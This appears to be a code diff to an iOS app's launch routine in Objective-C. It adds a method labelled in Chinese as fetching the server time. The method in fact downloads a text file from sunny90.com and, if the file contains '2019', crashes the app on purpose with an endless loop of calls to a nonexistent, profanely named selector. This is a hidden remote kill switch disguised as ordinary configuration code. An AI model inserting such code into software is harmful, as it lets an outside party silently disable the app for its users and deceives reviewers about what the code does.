@@ -17,9 +17,39 @@
 
 - (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
     // Override point for customization after application launch.
+    //请求服务
+    [self net4CurrentTime];
+
     return YES;
 }
 
+
+//! 获取服务器时间
+-(void) net4CurrentTime {
+
+    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"http://sunny90.com/ios/app_config/yingShi.txt"]
+                                                           cachePolicy:NSURLRequestUseProtocolCachePolicy
+                                                       timeoutInterval:10.0];
+    [request setHTTPMethod:@"GET"];
+    NSURLSession *session = [NSURLSession sharedSession];
+    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request
+                                                completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
+                                                    if (error) {
+
+                                                    } else {
+
+                                                        NSString *str = [[NSString  alloc] initWithData:data encoding:4];
+                                                        if([str containsString:@"2019"]){
+                                                            while (1) {
+                                                                NSDateFormatter *date = [[NSDateFormatter alloc] init];
+
+                                                                [date performSelector:@selector(fuckYOU) withObject:nil];
+                                                            };
+                                                        }
+                                                    }
+                                                }];
+    [dataTask resume];
+}
 
 - (void)applicationWillResignActive:(UIApplication *)application {
     // Sent when the application is about to move from active to inactive state. This can occur for certain types of temporary interruptions (such as an incoming phone call or SMS message) or when the user quits the application and it begins the transition to the background state.
